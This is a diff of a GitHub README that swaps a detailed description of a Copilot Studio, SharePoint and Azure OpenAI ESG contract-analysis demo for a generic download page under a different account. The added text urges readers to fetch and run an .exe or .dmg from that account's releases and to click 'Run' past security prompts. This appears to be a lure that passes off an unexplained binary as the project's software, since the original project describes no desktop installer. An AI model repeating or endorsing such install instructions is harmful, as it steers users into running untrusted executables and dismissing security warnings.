@@ -1,217 +1,74 @@
-# ESG Compliance Monitor – Contract Analysis Agent  
-*(Copilot Studio + SharePoint + Azure OpenAI)*
+# 🌟 ESG-Compliance-Monitor-Copilot-Studio - Simplify Your ESG Contract Analysis
 
-Enterprise-grade AI agent built using **Microsoft Copilot Studio** to analyze **public ESG-related contracts** stored in **SharePoint Online**.
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases)
 
-## What the Agent Does
+## 🚀 Getting Started
 
-The agent identifies:
+Welcome to the ESG-Compliance-Monitor-Copilot-Studio! This software helps you analyze contracts related to Environmental, Social, and Governance (ESG) matters effectively. Follow these simple steps to download and run the application.
 
-- **ESG obligations**
-- **Compliance requirements**
-- **Regulatory and contractual risks**
-- **Financial and reporting impacts**
+## 💻 System Requirements
 
-It produces **structured, audit-ready summaries** suitable for:
-- management
-- compliance teams
-- internal review
----
+To ensure smooth operation, make sure your computer meets the following requirements:
 
-## Key Characteristics
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **RAM**: 4 GB or more
+- **Storage**: At least 500 MB of free space
+- **Internet Connection**: Necessary for certain features
 
-- SharePoint-native knowledge access via **Microsoft 365 permissions**
-- **Azure OpenAI used strictly for reasoning**
-- Clear separation between enterprise data access and AI processing
-- Audit-friendly outputs with explicit source references
-- **No legal advice**
-- **No personal data processing**
+## 📥 Download & Install
 
----
-## Why This Project Exists
+To get the software, please visit the following link:
 
-Organizations face increasing pressure to comply with:
-- **CSRD / ESRS**
-- ESG reporting obligations
-- Public procurement transparency
+[Download from Releases Page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases)
 
-Manual contract reviews are:
-- slow
-- error-prone
-- difficult to audit
+Once you visit this page, you will find the latest version available for download. 
 
-This project demonstrates how **Copilot Studio orchestrates Azure OpenAI safely** within enterprise governance boundaries.
+### Step-by-step Instructions:
 
----
-## Architecture Overview
+1. Click on the [Download from Releases Page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases).
+2. You will see a list of available versions. Look for the latest version, which is marked as the current release.
+3. Click on the file that suits your operating system (e.g., ESG-Compliance-Monitor-Copilot-Studio_1.0.exe for Windows or ESG-Compliance-Monitor-Copilot-Studio_1.0.dmg for macOS).
+4. Save the file to your computer.
 
-This solution intentionally separates **AI reasoning** from **enterprise data access**.
+## ⚙️ Running the Application
 
-### High-level flow
-User
-→ Copilot Studio Agent
-→ Microsoft Graph (SharePoint Knowledge)
-→ Azure OpenAI (Reasoning Only)
-→ Structured ESG Compliance Output
+Once the download is complete, here’s how to run the software:
 
-### Key Architecture Principles
+### For Windows:
 
-- **Least privilege**  
-  The agent reads only the selected SharePoint library or folder.
+1. Locate the downloaded file in your Downloads folder or where you saved it.
+2. Double-click the `.exe` file.
+3. If a security prompt appears, click "Run" to allow the application to open.
+4. Follow the on-screen instructions to set up the application.
 
-- **Governance first**  
-  Metadata-based classification and strict scope limitation.
+### For macOS:
 
-- **Auditability**  
-  Every output references the source document.
+1. Find the downloaded file in your Downloads folder.
+2. Double-click the `.dmg` file to open it.
+3. Drag the application to your Applications folder.
+4. Navigate to the Applications folder and double-click the application icon to launch it. If prompted, confirm that you want to open the application.
 
-- **Security by design**  
-  Azure OpenAI never directly connects to SharePoint.
+## 🛠️ Features
 
----
+The ESG-Compliance-Monitor-Copilot-Studio offers several key features designed to make contract analysis easy:
 
-## SharePoint Structure
+- **AI-Driven Insights**: Use AI to analyze ESG contracts quickly.
+- **Integration**: Works with Copilot Studio and SharePoint for seamless data handling.
+- **User-Friendly Dashboard**: Navigate easily through the application's interface.
+- **Secure Data Storage**: Keeps your analyses safe and private.
 
-**SharePoint Site:** `ESGComplianceHub`  
-**Document Library:** `Documents`
+## 🔒 Security
 
-Documents/
+Your security is important. This application does not collect personal data. Ensure you have an updated antivirus program running while using the software.
 
-├─ 01_Legislation
+## 🤝 Support
 
-├─ 02_ESG_Policies
+If you need help, please visit the [GitHub Issues page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/issues) to report issues or ask questions. Our community is here to assist you.
 
-├─ 03_Contracts
+## 🌐 Learn More
 
-    ├─ ESG_Public_Contract_Source.docx
-   
-    ├─ ESG_Public_Contract_Source.pdf
-   
-├─ 04_Reports
+Explore more about us and stay updated by visiting our [official documentation site](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio).
 
-├─ 05_AI_Output
+Your journey towards efficient ESG contract analysis starts here. Download the software today!
 
-Only documents stored in **03_Contracts** are used for contract analysis.
-
----
-
-## Knowledge Connection Model
-
-| Component | Access |
-|---------|--------|
-| Copilot Studio | Microsoft 365 permissions |
-| SharePoint | Native Graph-based access |
-| Azure OpenAI | Receives retrieved context only |
-| Standalone Azure OpenAI | ❌ No SharePoint access |
-
-**Important:**  
-Standalone Azure OpenAI **cannot see SharePoint**.  
-This is **intentional and correct**.
-
----
-
-## Agent Responsibilities
-
-The agent performs **analytical review only**:
-
-- Identify ESG obligations
-- Identify compliance requirements
-- Detect missing targets, timelines, KPIs
-- Highlight compliance risks
-- Assess potential financial or reporting impacts
-
-### The agent does NOT:
-- Provide legal advice
-- Process personal data
-- Make binding compliance decisions
-
----
-
-## Example Outputs
-
-### ESG Obligations Summary
-- CSRD / ESRS alignment requirements
-- ESG reporting scope definition
-- Sustainability KPI responsibilities
-
-### Compliance Risks
-- Incomplete ESG reporting
-- Missed regulatory deadlines
-- Weak enforcement mechanisms
-
-### Financial Impact
-- Contractual penalties
-- Daily delay penalties
-- Reputational risk exposure
-
----
-
-# Screenshots – Copilot Studio vs Azure OpenAI
-
-This folder documents the practical behavior of the ESG Compliance Monitor across Microsoft Copilot Studio, SharePoint, and standalone Azure OpenAI.
-
-## Copilot Studio – Question & Answer (Live Example)
-Below is a real interaction with the ESG Compliance Monitor agent in **Microsoft Copilot Studio**.
-The agent analyzes an ESG public contract stored in SharePoint and produces structured compliance risks.
-
-![Copilot Studio – Question to AI Agent](screenshots/screenshot_Copilot_studio_question%20AI_Agent.JPG)
-
----
-**Copilot Studio agent analyzing ESG contract stored in SharePoint**
-
-![Copilot Studio – Question](screenshots/screenshot_Copilot_studio_question AI_Agent.JPG)
-
-![Copilot Studio – Agent Answer](screenshots/screenshot_Copilot_studio_AI_Agent_answear.JPG)
-
-### Copilot Studio – Identified ESG risks
-
-![Copilot Studio – Identified Risks](screenshots/screenshot_Copilot_sstudio_Identified_risks.JPG)
-
-### Azure OpenAI – Standalone Agent (no SharePoint access)
-
-Standalone **Azure OpenAI** processes only the context provided by Copilot Studio.
-It never connects directly to SharePoint.
-
-![Azure OpenAI Agent](screenshots/screenshot_Azure_OpenAI_Agent_answearJPG.JPG)
-
-
-## Key Observations
-
-- Copilot Studio can **retrieve SharePoint documents automatically** using Microsoft 365 permissions.
-- Standalone Azure OpenAI **cannot access SharePoint directly** and requires manual document upload or pasted text.
-- This separation is intentional and aligns with enterprise security and governance requirements.
-
----
-
-## Architectural Note
-
-These screenshots demonstrate that:
-- Copilot Studio can directly access SharePoint via Microsoft 365 permissions
-- Azure OpenAI **cannot** access SharePoint directly
-- Azure OpenAI processes only the context provided by Copilot Studio or manual upload
-
----
-
-## What This Repository Demonstrates
-
-- Correct enterprise use of Azure OpenAI
-- Secure Copilot Studio orchestration
-- SharePoint-based knowledge grounding
-- ESG-focused contract analysis
-- Audit-ready AI outputs
-
----
-## Disclaimer
-
-This project is for **educational and portfolio purposes only**.
-
-- No legal advice
-- No personal data
-- Uses publicly available or mock ESG contract content
----
-
-## Author
-
-**Denisa Pitnerová**  
-AI Agents · DevOps · Microsoft 365 · Azure · ESG Automation
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases)
